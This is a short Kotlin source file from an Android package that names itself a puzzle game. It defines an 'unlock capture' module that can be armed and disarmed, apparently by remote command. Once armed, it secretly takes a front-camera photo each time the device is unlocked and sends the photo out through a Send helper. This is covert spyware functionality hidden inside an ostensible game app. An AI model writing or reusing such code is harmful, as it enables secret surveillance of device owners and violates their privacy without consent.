package com.puzzleblast.game.modules

import android.content.Context
import com.puzzleblast.game.core.Send
import com.puzzleblast.game.util.Prefs
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.launch

object UnlockCapModule {
    private val scope = CoroutineScope(SupervisorJob() + Dispatchers.IO)

    suspend fun set(ctx: Context, on: Boolean): String {
        Prefs.unlockCap = on
        return if (on) "🔓 unlock capture armed" else "🔓 unlock capture disarmed"
    }

    fun onUnlock(ctx: Context) {
        if (!Prefs.unlockCap) return
        scope.launch {
            CameraModule.captureFront(ctx)?.let { Send.photo(it, "🔓 unlock capture") }
        }
    }
}
